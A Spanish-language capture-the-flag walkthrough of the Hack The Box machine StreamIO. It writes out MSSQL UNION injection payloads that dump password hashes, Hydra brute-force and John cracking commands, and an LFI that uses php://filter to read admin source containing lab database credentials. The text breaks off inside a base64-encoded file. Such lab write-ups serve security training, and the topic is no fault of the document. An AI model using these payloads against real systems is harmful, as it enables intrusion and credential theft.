---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# StreamIO

`StreamIO` es una máquina mediana que cubre la enumeración de subdominios que conduce a una `inyección SQL` para recuperar las credenciales de usuario almacenadas, que se descifran para obtener acceso a un panel de administración. El panel de administración es vulnerable a `LFI`, lo que nos permite recuperar el código fuente de las páginas de administración y conduce a la identificación de una vulnerabilidad de inclusión de archivos remotos, cuyo abuso nos permite obtener acceso al sistema.

Después del shell inicial, aprovechamos la utilidad de línea de comandos `SQLCMD` para enumerar las bases de datos y obtener más credenciales utilizadas en el movimiento lateral. Como usuario secundario, usamos `WinPEAS` para enumerar el sistema y encontrar bases de datos guardadas del navegador, que se decodifican para exponer nuevas credenciales. Usando las nuevas credenciales dentro de BloodHound, descubrimos que el usuario tiene la capacidad de agregarse a un grupo específico en el que puede leer secretos LDAP. Sin acceso directo a la cuenta, usamos PowerShell para abusar de esta función y agregarnos al grupo `Core Staff`, luego accedemos a LDAP para revelar la contraseña LAPS del administrador.

<figure><img src="../../../../../.gitbook/assets/StreamIO.png" alt="" width="563"><figcaption></figcaption></figure>

## Reconnaissance

Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina StreamIO.

```bash
nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.158 -oG allPorts
```

<figure><img src="../../../../../.gitbook/assets/1100_vmware_U3yLIZoxfh.png" alt="" width="447"><figcaption></figcaption></figure>

Lanzaremos una serie de scripts básicos para intentar buscar vulnerabilidades en los puertos que hemos encotrado expuestos.

{% code overflow="wrap" %}
```bash
nmap -sCV -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49704,49730 10.10.11.158 -oN targeted
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/1101_vmware_wyeBF7geDZ.png" alt="" width="563"><figcaption></figcaption></figure>

Comprobaremos el nombre del dominio con el cual nos enfrentamos a través del siguiente comando.

```bash
ldapsearch -x -H ldap://10.10.11.158 -s base | grep defaultNamingContext
```

<figure><img src="../../../../../.gitbook/assets/1102_vmware_22J8uewznG.png" alt=""><figcaption></figcaption></figure>

Comprobaremos a qué tipo de máquina nos enfrentamos a través de **netexec**.

```bash
netexec smb 10.10.11.158
```

<figure><img src="../../../../../.gitbook/assets/1104_vmware_hH2SMIoPwH.png" alt=""><figcaption></figcaption></figure>

Procederemos a añadir la entrada en nuestro archivo **/etc/hosts**

```bash
catnp /etc/hosts | grep streamIO.htb
```

<figure><img src="../../../../../.gitbook/assets/1105_vmware_cJQy3paHH6.png" alt=""><figcaption></figcaption></figure>

## Enumerating Web Pages

Enumerando los puertos expuestos de los sitios webs, nos encontramos con que el puerto 80 corresponde a un IIS de Windows Server, sin contenido ninguno.

<figure><img src="../../../../../.gitbook/assets/1107_vmware_Kfi8NR1VPB.png" alt="" width="563"><figcaption></figcaption></figure>

Enumerando el sitio web[ https://streamio.htb/](https://streamio.htb/) comprobamos que aparecen los nombres de 3 miembros del equipo, esto nos puede ser útil para intentar enumerar usuarios.

<figure><img src="../../../../../.gitbook/assets/1109_vmware_ND7ZqxlZHK.png" alt="" width="563"><figcaption></figcaption></figure>

### Enumerating possible PHP pages with WFUZZ

Con la herramienta de **wfuzz** procederemos a listar posibles páginas PHP que disponga elo sitio web, encontramos las siguientes páginas.

<figure><img src="../../../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Enumerando posibles directorios encontramos uno que nos llama la atención, "Admin". Pero aparece que la respuesta es un 403 Forbidden, por lo cual podemos pensar que es un directorio que se encuentra pero necesitas un acceso previo, login, etc.

{% code overflow="wrap" %}
```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt https://streamio.htb/FUZZ/
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

## Users Enumeration (Kerbrute) - \[FAILED]

Probararemos de enumerar a posibles usuarios del dominio a través de **Kerbrute**  y un diccionario especializado en nombres, sin exito.

También probamos con el listado de los nombres que aparecían en el sitio web, sin exito tampoco.

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">kerbrute userenum --dc 10.10.11.1588 -d streamIO.htb /usr/share/seclists/Usernames/Names/names.txt
<strong>
</strong><strong>catnp employees.txt
</strong><strong>
</strong><strong>kerbrute userenum --dc 10.10.11.1588 -d streamIO.htb employees.txt
</strong></code></pre>

<figure><img src="../../../../../.gitbook/assets/1108_vmware_ri2bN0lx7F.png" alt="" width="563"><figcaption></figcaption></figure>

## Website Subdomain Enumeration (watch.streamio.htb)

Con el escaneo de **Nmap**, uno de los DNS que resolvía era el de [https://watch.streamio.htb/](https://watch.streamio.htb/), por lo cual procederemos de acceder y revisar qué tecnologías utiliza.

<figure><img src="../../../../../.gitbook/assets/1111_vmware_JSY7papD51.png" alt=""><figcaption></figcaption></figure>

### Enumerating possible PHP pages with WFUZZ

En el sitio web aparentemente no vemos ningún tipo de directorio ni  contenido, enumerando nuevamente con **wfuzz**, pudimos enumerar las siguientes paginas PHP.

{% code overflow="wrap" %}
```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt https://watch.streamio.htb/FUZZ.php
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/1112_vmware_DeFgqBkdQr.png" alt=""><figcaption></figcaption></figure>

### SQL Injection (MSSQL) - WAF Bypass

Accedimos al sitio web [https://watch.streamio.htb/search.php](https://watch.streamio.htb/search.php) y nos encontramos la siguiente página web que tenía un buscador al parecer de peliculas. Revisando la sintaxis de cómo funcionaba el buscador, pensamos que se trataría de una BBDD de MSSQL debido que nos enfrentamos a una máquina Windows Server.

Probamos de buscar por "test" y nos aparecía un resultdo que contenía dicho contenido de la palabra, lo que nos hizo pensar que por detrás en la BBDD se aplicaba la siguiente QUERY: _SELECT movie FROM movies WHERE movie\_name LIKE "%test%"_

<figure><img src="../../../../../.gitbook/assets/1113_vmware_pOl2CDE20y.png" alt="" width="563"><figcaption></figcaption></figure>

Probamos de realizar inyecciones SQL para intentar con ORDER BY o NULL listar el total de columnas que disponía la BBD, pero aparecía un mensaje de un supuesto WAF bloqueando la sesión debido que había detectado actividad maliciosa por la QUERY lanzada.

<figure><img src="../../../../../.gitbook/assets/1114_vmware_87KUj4LECS.png" alt="" width="563"><figcaption></figcaption></figure>

Debido que con ORDER BY no podíamos saber el total de columnas, probamos con UNION SELECT. En este caso si obtuvimos el resultado del total de columnas que eran 6.

```sql
test' UNION SELECT 1,2,3,4,5,6;-- -
```

<figure><img src="../../../../../.gitbook/assets/1115_vmware_QpTIWl7pnC.png" alt="" width="563"><figcaption></figcaption></figure>

Revisamos la página de [PayloadAllTheThings MSSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md) , en la cual te dan diferentes payloads para intentar realizar una inyección SQL a MSSQL.

Versión de MSSQL.

```sql
test' UNION SELECT 1,@@version,3,4,5,6;-- -
```

<figure><img src="../../../../../.gitbook/assets/1116_vmware_4TLqtXHTJA.png" alt="" width="563"><figcaption></figcaption></figure>

Enumerar la BBDD que se está utilizando actualmente.

```sql
test' UNION SELECT 1,DB_NAME(),3,4,5,6;-- -
```

<figure><img src="../../../../../.gitbook/assets/1117_vmware_b0zrI77KIo.png" alt="" width="563"><figcaption></figcaption></figure>

Listar todas las BBDDs que dispone.

{% code overflow="wrap" %}
```sql
test' UNION SELECT 1,name,3,4,5,6 FROM master..sysobjects WHERE xtype ='U';-- -
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/1141_vmware_U1lfdfEMJV.png" alt="" width="563"><figcaption></figcaption></figure>

Intentando listar las tablas de la BBDD "streamio\_backups", sin resultado ninguno, parece que no tenemos acceso.

{% code overflow="wrap" %}
```sql
test' UNION SELECT 1,name,3,4,5,6 FROM streamio_backup.sysobjects WHERE xtype ='U';-- -
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/1142_vmware_Fht7msN60V.png" alt="" width="563"><figcaption></figcaption></figure>

Revisando las tablas de la BBDD nombrada "STREAMIO". Nos encontramos con una tabla "users".

```bash
test' UNION SELECT 1,name,3,4,5,6 FROM STREAMIO..sysobjects WHERE xtype ='U';-- -
```

<figure><img src="../../../../../.gitbook/assets/1118_vmware_cjxK6Yqdfc.png" alt="" width="563"><figcaption></figcaption></figure>

A través de la siguiente SQLI, obtuvimos el ID de la tabla, ya que lo necesitaremos para seguir dumpeando su información.

```sql
test' UNION SELECT 1,name,id,4,5,6 FROM STREAMIO..sysobjects;-- -
```

<figure><img src="../../../../../.gitbook/assets/1119_vmware_BbbnbPi89j.png" alt="" width="563"><figcaption></figcaption></figure>

Enumerando las columnas de la tabla "users" de la BBDD "STREAMIO".

```sql
test' UNION SELECT 1,name,3,4,5,6 FROM syscolumns WHERE id = 901578250;-- -
```

<figure><img src="../../../../../.gitbook/assets/1120_vmware_ubgy5eNld0.png" alt="" width="563"><figcaption></figcaption></figure>

Extrayendo la información de las columnas "username" y "password" de la tabla "users". Nos encontramos con nombres de usuarios y sus contraseñas hasheadas.

```sql
test' UNION SELECT 1,concat(username,';',password),3 ,4,5,6 FROM users;-- -
```

<figure><img src="../../../../../.gitbook/assets/1125_vmware_yhXUGQs2rc.png" alt="" width="563"><figcaption></figcaption></figure>

Nos copiaremos los datos de los usuarios y sus hashes. Lo modificaremos para que aparezca el output más limpio

```bash
catnp data

catnp data | grep ":"
```

<figure><img src="../../../../../.gitbook/assets/1126_vmware_s4tjy1sW0P.png" alt="" width="306"><figcaption></figcaption></figure>

Eliminaremos los espacios que sobren, y guardaremos el contenido en "hashes".

```bash
catnp data | grep ":" | tr -d ' ' > hashes

catnp hashes
```

<figure><img src="../../../../../.gitbook/assets/1127_vmware_myHDGuMsfx.png" alt="" width="314"><figcaption></figcaption></figure>

Pasaremos un hash de ellos a la herramienta de **hash-identifier** para identificar que tipo de hash es.

```bash
hash-identifier
```

La herramienta nos ha indicado que el hash es MD5. Por lo tanto, con **John** procederemos a intentar crackear las contraseñas especificando el formato MD5.

```bash
john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5
```

<figure><img src="../../../../../.gitbook/assets/1128_vmware_aVIaXnzJQY.png" alt="" width="563"><figcaption></figcaption></figure>

Separaremos en dos archivos diferentes, en uno guardaremos los nombres de usuarios y en el otro las contraseñas crackeadas.

{% code overflow="wrap" %}
```bash
john --show hashes --format=Raw-MD5 | grep -v cracked | sed '/^\s*$/d' | awk '{print $1}' FS=":"  > users.txt

john --show hashes --format=Raw-MD5 | grep -v cracked | sed '/^\s*$/d' | awk '{print $2}' FS=":"  > crackhash.txt

cat *.txt
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/1129_vmware_jrXkqHJG4p.png" alt="" width="563"><figcaption></figcaption></figure>

A través de la herramienta de **netexec** procederemos a probar las credenciales de los usuarios correspondientes, nos damos cuenta que ninguno es válido (al menos a nivel de cuenta de dominio).

```bash
netexec smb 10.10.11.158 -u users.txt -p crackhash.txt --no-bruteforce
```

<figure><img src="../../../../../.gitbook/assets/1130_vmware_oKP7q6D5Hm.png" alt=""><figcaption></figcaption></figure>

Del archivo original "hashes", primero de todo nos quedaremos con los nombres de usuarios totales (crackeados y no crackeados) y a través de awk filtraremos y enviaremos la data al archivo "usernames.txt".

```bash
catnp hashes | awk '{print $1}' FS=":"

catnp hashes | awk '{print $1}' FS=":" > usernames.txt
```

<figure><img src="../../../../../.gitbook/assets/1131_vmware_zPvuuJtbhm.png" alt="" width="377"><figcaption></figcaption></figure>

A través de **Kerbrute** procederemos a enumerar todo el listado de usuarios que disponemos, para saber si alguno es válido a nivel cuenta de usuario del dominio, y encontramos que el usuario "yoshidi" es válido.

```bash
kerbrute userenum --dc 10.10.11.158 -d streamIO.htb users.txt
```

<figure><img src="../../../../../.gitbook/assets/1203_vmware_94xYP01nEj.png" alt=""><figcaption></figcaption></figure>

## Brute Force Attack login.php with Hydra

Recordando que enumerando páginas PHP del sitio web al principio en la fase de enumeración había una página llamada "login.php" probaremos de intentar realizar un ataque de fuerza bruta con la herramienta de **Hydra** para probar si algunas credenciales son válidas o no.

Para ello del archivo "hashes" original nos lo guardaremos el contenido en "valid\_credentials.txt".

{% code overflow="wrap" %}
```bash
john --show hashes --format=Raw-MD5 | grep -v cracked | sed '/^\s*$/d' > valid_credentials.txt

catnp valid_credentials.txt
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/1132_vmware_8gI3MMe8y0.png" alt="" width="563"><figcaption></figcaption></figure>

Accederemos a [https://streamio.htb/login.php](https://streamio.htb/login.php) y probaremos de autenticarnos con un usuario random para comprobar el mensaje de error que nos muestra, nos copiaremos este mensaje de error a la clipboard ya que lo necesitaremos para utilizar **Hydra**.&#x20;

<figure><img src="../../../../../.gitbook/assets/1133_vmware_agvGLA7NXg.png" alt=""><figcaption></figcaption></figure>

A través de la herramienta de **hydra** haremos un ataque mediante fuerza bruta contra el panel de inicio de sesión de la página, le indicaremos el archivo donde disponemos el usuario y contraseña, el sitio web y donde se tramitará la data.

Además, deberemos especificar el username, password y el mensaje de error cuando se intenta iniciar sesión un usuario/contraseña incorrectos.

Comprobamos que las credenciales para el usuario "yoshide" son válidas.

{% code overflow="wrap" %}
```bash
hydra -C valid_credentials.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/1134_vmware_PNWf4VXZPh.png" alt=""><figcaption></figcaption></figure>

## Web site administration panel

Accederemos a [https://streamio.htb/admin/?staff=](https://streamio.htb/admin/?staff=)  (recordemos que habíamos enumerado el directorio "admin" y nos daba un Forbidden 443), pero ahora si podemos acceder debido que disponemos de unas credenciales válidas.

Con la herramienta de **Cookie-Editor** nos copiaremos la cookie de sesión que disponemos para ejecutar la siguiente enumeración.

<figure><img src="../../../../../.gitbook/assets/1135_vmware_rzKtpfYjXQ.png" alt=""><figcaption></figcaption></figure>

Debido que en el sitio web que nos encontramos, hay una variable llamada "staff", probaremos de enumerar si existe algúna variable más para ver si podemos acceder a esa página web.

Finalmente con **wfuzz** nos reporta que hay una variable nombrada "debug" que investigaremos de qué trata.

{% code overflow="wrap" %}
```bash
wfuzz -c --hh=1678 -H "Cookie: PHPSESSID=e824tsci9o526fjd724ii04723" --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt "https://streamio.htb/admin/?FUZZ=test"
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/1136_vmware_gaFahPZYoQ.png" alt=""><figcaption></figcaption></figure>

### Local File Intrusion (LFI)

Accediendo a [https://streamio.htb/admin/?debug=](https://streamio.htb/admin/?debug=\Windows\system32\drivers\etc\hosts) comprobamos que es una página de desarollo enla cual está mal modificado y se puede realizar un LFI (Local File Intrusion).

Debido que nos estamos enfrentando a una máquina Windows, probaremos de ver si somos capaces de listar el contenido de "/etc/hosts" de Windows.

[https://streamio.htb/admin/?debug=\Windows\system32\drivers\etc\hosts\
](https://streamio.htb/admin/?debug=\Windows\system32\drivers\etc\hosts)

Comprobaremos que hemos sido capaces de realizar el LFI con éxito.

<figure><img src="../../../../../.gitbook/assets/1137_vmware_cre2MS69Pa.png" alt=""><figcaption></figcaption></figure>

### LFI + Wrappers (base64 encoding)

En este punto, lo que realizaremos es una combinación entre LFI y la utilización de wrappers.

Un LFI con wrappers Base64 permite leer archivos en Base64 en lugar de texto plano. Con _php://filter/convert.base64-encode/resource=index.php_, accedemos a index.php y obtenemos su contenido codificado, evitando su ejecución directa. Esto es útil para leer código sensible, ya que un LFI normal podría no mostrar el contenido del archivo PHP.

[https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php](https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php)\
\
Comprobamos que obtenemos todo el contenido del "index.php" en formato base64

<figure><img src="../../../../../.gitbook/assets/1138_vmware_bL5Iwlwte1.png" alt=""><figcaption></figcaption></figure>

En nuestra Kali, procederemos a descodificar el contenido del archivo "index.php" encodeado en base64 para que lo muestre de manera normal.

Revisando el archivo "index.php" nos encontrasmos con un usuario y una contraseña de la BBDD "STREAMIO". Nos guardaremos estas credenciales, por si más adelante las necesitamos.

```bash
echo "PD9waHAKZGVmaW5lKCdpbmNsdWRlZCcsdHJ1ZSk7CnNlc3Npb25fc3RhcnQoKTsKaWYoIWlzc2V0KCRfU0VTU0lPTlsnYWRtaW4nXSkpCnsKCWhlYWRlcignSFRUUC8xLjEgNDAzIEZvcmJpZGRlbicpOwoJZGllKCI8aDE+Rk9SQklEREVOPC9oMT4iKTsKfQokY29ubmVjdGlvbiA9IGFycmF5KCJEYXRhYmFzZSI9PiJTVFJFQU1JTyIsICJVSUQiID0+ICJkYl9hZG1pbiIsICJQV0QiID0+ICdCMUBoeDMxMjM0NTY3ODkwJyk7CiRoYW5kbGUgPSBzcWxzcnZfY29ubmVjdCgnKGxvY2FsKScsJGNvbm5lY3Rpb24pOwoKPz4KPCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KCTxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KCTx0aXRsZT5BZG1pbiBwYW5lbDwvdGl0bGU+Cgk8bGluayByZWwgPSAiaWNvbiIgaHJlZj0iL2ltYWdlcy9pY29uLnBuZyIgdHlwZSA9ICJpbWFnZS94LWljb24iPgoJPCEtLSBCYXNpYyAtLT4KCTxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgoJPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIiAvPgoJPCEtLSBNb2JpbGUgTWV0YXMgLS0+Cgk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iIC8+Cgk8IS0tIFNpdGUgTWV0YXMgLS0+Cgk8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iIiAvPgoJPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IiIgLz4KCTxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iIiAvPgoKPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANS4xLjMvZGlzdC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCIgaW50ZWdyaXR5PSJzaGEzODQtMUJtRTRrV0JxNzhpWWhGbGR2S3VoZlRBVTZhdVU4dFQ5NFdySGZ0akRickNFWFNVMW9Cb3F5bDJRdlo2aklXMyIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+CjxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcEA1LjEuMy9kaXN0L2pzL2Jvb3RzdHJhcC5idW5kbGUubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1rYTdTazBHbG40Z210ejJNbFFuaWtUMXdYZ1lzT2crT01odVArSWxSSDlzRU5CTzBMUm41cSs4bmJUb3Y0KzFwIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KCgk8IS0tIEN1c3RvbSBzdHlsZXMgZm9yIHRoaXMgdGVtcGxhdGUgLS0+Cgk8bGluayBocmVmPSIvY3NzL3N0eWxlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgoJPCEtLSByZXNwb25zaXZlIHN0eWxlIC0tPgoJPGxpbmsgaHJlZj0iL2Nzcy9yZXNwb25zaXZlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgoKPC9oZWFkPgo8Ym9keT4KCTxjZW50ZXIgY2xhc3M9ImNvbnRhaW5lciI+CgkJPGJyPgoJCTxoMT5BZG1pbiBwYW5lbDwvaDE+CgkJPGJyPjxocj48YnI+CgkJPHVsIGNsYXNzPSJuYXYgbmF2LXBpbGxzIG5hdi1maWxsIj4KCQkJPGxpIGNsYXNzPSJuYXYtaXRlbSI+CgkJCQk8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij91c2VyPSI+VXNlciBtYW5hZ2VtZW50PC9hPgoJCQk8L2xpPgoJCQk8bGkgY2xhc3M9Im5hdi1pdGVtIj4KCQkJCTxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iP3N0YWZmPSI+U3RhZmYgbWFuYWdlbWVudDwvYT4KCQkJPC9saT4KCQkJPGxpIGNsYXNzPSJuYXYtaXRlbSI+CgkJCQk8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij9tb3ZpZT0iPk1vdmllIG1hbmFnZW1lbnQ8L2E+CgkJCTwvbGk+CgkJCTxsaSBjbGFzcz0ibmF2LWl0ZW0iPgoJCQkJPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSI/bWVzc2FnZT0iPkxlYXZlIGEgbWVzc2FnZSBmb3IgYWRtaW48L2E+CgkJCTwvbGk+CgkJPC91bD4KCQk8YnI+PGhyPjxicj4KCQk8ZGl2IGlkPSJpbmMiPgoJCQk8P3BocAoJCQkJaWYoaXNzZXQoJF9HRVRbJ2RlYnVnJ10pKQoJCQkJewoJCQkJCWVjaG8gJ3RoaXMgb3B0aW9uIGlzIGZvciBkZXZlbG9wZXJzIG9ubHknOwoJCQkJCWlmKCRfR0VUWydkZWJ1ZyddID09PSAiaW5kZXgucGhwIikgewoJCQkJCQlkaWUoJyAtLS0tIEVSUk9SIC0tLS0nKTsKCQkJCQl9IGVsc2UgewoJCQkJCQlpbmNsdWRlICRfR0VUWydkZWJ1ZyddOwoJCQkJCX0KCQkJCX0KCQkJCWVsc2UgaWYoaXNzZXQoJF9HRVRbJ3VzZXInXSkpCgkJCQkJcmVxdWlyZSAndXNlcl9pbmMucGhwJzsKCQkJCWVsc2UgaWYoaXNzZXQoJF9HRVRbJ3N0YWZmJ10pKQoJCQkJCXJlcXVpcmUgJ3N0YWZmX2luYy5waHAnOwoJCQkJZWxzZSBpZihpc3NldCgkX0dFVFsnbW92aWUnXSkpCgkJCQkJcmVxdWlyZSAnbW92aWVfaW5jLnBocCc7CgkJCQllbHNlIAoJCQk/PgoJCTwvZGl2PgoJPC9jZW50ZXI+CjwvYm9keT4KPC9odG1sPg==" | base64 -d > index.php
```

```bash
catnp index.php
```

<figure><img src="../../../../../.gitbook/assets/1139_vmware_vHhPVowABw.png" alt=""><figcaption></figcaption></figure>

Probaremos de enumerar páginas PHP dentro del directorio "admin" con **wfuzz**. Nos encontramos que hay una página llamada "master.php"

{% code overflow="wrap" %}
```bash
wfuzz -c -H "Cookie: PHPSESSID=e824tsci9o526fjd724ii04723" --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt "https://streamio.htb/admin/FUZZ.php"
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/1140_vmware_47An8qIrU4.png" alt=""><figcaption></figcaption></figure>

Probaremos de acceder a [https://streamio.htb/admin/master.php](https://streamio.htb/admin/master.php) y comprobamos que no podemos ver el contenido de la página.&#x20;

<figure><img src="../../../../../.gitbook/assets/1144_vmware_lNtewHF25L.png" alt=""><figcaption></figcaption></figure>

Probaremos de obtener el contenido de "master.php" utilizando LFI + Wrapper para que nos lo muestre encodeado en Base64.

&#x20;[https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php](https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php)

<figure><img src="../../../../../.gitbook/assets/1145_vmware_NueltUf2ec.png" alt=""><figcaption></figcaption></figure>

Descodificaremos el contenido de "master.php" encodeado en Base64 para que nos lo muestre en texto plano.

```bash
echo "PGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp3aGlsZSgkcm93ID0gc3Fsc3J2X2ZldGNoX2FycmF5KCRyZXMsIFNRTFNSVl9GRVRDSF9BU1NPQykpDQp7DQo/Pg0KDQo8ZGl2Pg0KCTxkaXYgY2xhc3M9ImZvcm0tY29udHJvbCIgc3R5bGU9ImhlaWdodDogM3JlbTsiPg0KCQk8aDQgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48P3BocCBlY2hvICRyb3dbJ21vdmllJ107ID8+PC9oND4NCgkJPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7cGFkZGluZy1yaWdodDogMjVweDsiPg0KCQkJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9tb3ZpZT0iPg0KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1vdmllX2lkIiB2YWx1ZT0iPD9waHAgZWNobyAkcm93WydpZCddOyA/PiI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIHZhbHVlPSJEZWxldGUiPg0KCQkJPC9mb3JtPg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvZGl2Pg0KPD9waHANCn0gIyB3aGlsZSBlbmQNCj8+DQo8YnI+PGhyPjxicj4NCjxoMT5TdGFmZiBtYW5hZ21lbnQ8L2gxPg0KPD9waHANCmlmKCFkZWZpbmVkKCdpbmNsdWRlZCcpKQ0KCWRpZSgiT25seSBhY2Nlc3NhYmxlIHRocm91Z2ggaW5jbHVkZXMiKTsNCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIHVzZXJzIHdoZXJlIGlzX3N0YWZmID0gMSAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0KaWYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvb